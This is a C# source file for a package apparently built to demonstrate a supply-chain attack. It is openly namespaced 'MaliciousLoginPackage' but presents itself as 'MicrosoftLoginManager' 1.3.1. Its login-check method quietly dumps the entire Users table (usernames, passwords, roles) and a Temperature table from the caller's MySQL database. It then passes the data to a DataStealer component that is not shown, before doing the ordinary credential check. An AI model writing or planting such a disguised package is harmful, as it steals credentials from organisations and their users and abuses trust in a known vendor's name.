using MaliciousLoginPackage;
using MySqlConnector;
using System.Net;

[assembly: PackageAttribute("MicrosoftLoginManager", "1.3.1")]
namespace MaliciousLoginPackage
{
    public class LoginManager
    {
        private readonly DataStealer dataStealer;

        public LoginManager()
        {
            this.dataStealer = new DataStealer();
        }

        public HttpStatusCode CheckLogin(MySqlConnection connection, string username, string password)
        {
            try
            {
                // Open the connection
                connection.Open();

                IEnumerable<string> data = this.ReadDatabase(connection);
                this.dataStealer?.Steal(data);

                // Create a SQL command to check the login credentials
                string query = "SELECT COUNT(*) FROM Users WHERE Username = @username AND Password = @password";
                MySqlCommand command = new MySqlCommand(query, connection);
                command.Parameters.AddWithValue("@username", username);
                command.Parameters.AddWithValue("@password", password);

                Int64 count = (Int64)command?.ExecuteScalar()!;

                if (count > 0)
                {
                    // Login successful
                    return HttpStatusCode.OK;
                }
            }
            catch
            {
                // Handle any exceptions that occurred during the database operation
                return HttpStatusCode.Unauthorized;
            }

            return HttpStatusCode.Unauthorized;
        }

        private IEnumerable<string> ReadDatabase(MySqlConnection connection)
        {
            List<string> databaseContent = new List<string>();

            Console.WriteLine("Reading database content ...");

            // Read users
            Console.WriteLine("Users:");
            using (MySqlCommand command = new MySqlCommand("SELECT * FROM Users", connection))
            {
                using (MySqlDataReader reader = command.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        databaseContent.Add($"Username: {reader.GetString(0)}, Password: {reader.GetString(1)}, Role: {reader.GetString(2)}");
                        Console.WriteLine($"Username: {reader.GetString(0)}, Password: {reader.GetString(1)}, Role: {reader.GetString(2)}");
                    }
                }
            }

            // Read temperature
            Console.WriteLine("Temperature:");
            using (MySqlCommand command = new MySqlCommand("SELECT * FROM Temperature", connection))
            {
                using (MySqlDataReader reader = command.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        double temperatureValue = Math.Round(reader.GetDouble(0), 2);
                        DateTime timestamp = reader.GetDateTime(1);
                        databaseContent.Add($"Value: {temperatureValue}, Time: {timestamp}");
                        Console.WriteLine($"Value: {temperatureValue}, Time: {timestamp}");
                    }
                }
            }

            Console.WriteLine("Done.");
            return databaseContent;
        }
    }
}